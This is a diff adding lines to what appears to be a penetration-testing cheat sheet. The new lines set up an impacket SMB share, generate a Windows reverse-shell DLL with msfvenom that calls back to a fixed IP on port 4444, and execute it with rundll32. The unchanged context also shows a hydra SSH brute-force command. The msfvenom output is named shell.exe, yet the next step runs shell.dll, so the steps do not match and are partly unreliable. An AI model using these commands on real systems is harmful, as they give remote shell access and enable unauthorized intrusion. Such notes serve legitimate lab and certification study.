@@ -299,6 +299,24 @@ hydra -l USERNAME -p PASSWORD_LIST IP -t 4 ssh
 
 https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/
 
+## Setup an SMB share using impacket
+
+```
+impacket-smbserver -ip $IP smb $FOLDER_LOCATION
+```
+
+## Executing a dll from an SMB Share
+
+Generate payload
+```
+msfvenom -p windows/shell_reverse_tcp LHOST=192.168.119.242 LPORT=4444 EXITFUNC=thread -f dll -o shell.exe
+```
+
+Execute
+```
+rundll32.exe \\IP\smb\shell.dll,0
+```
+
 # Priv Escalation
 
 ## Linux
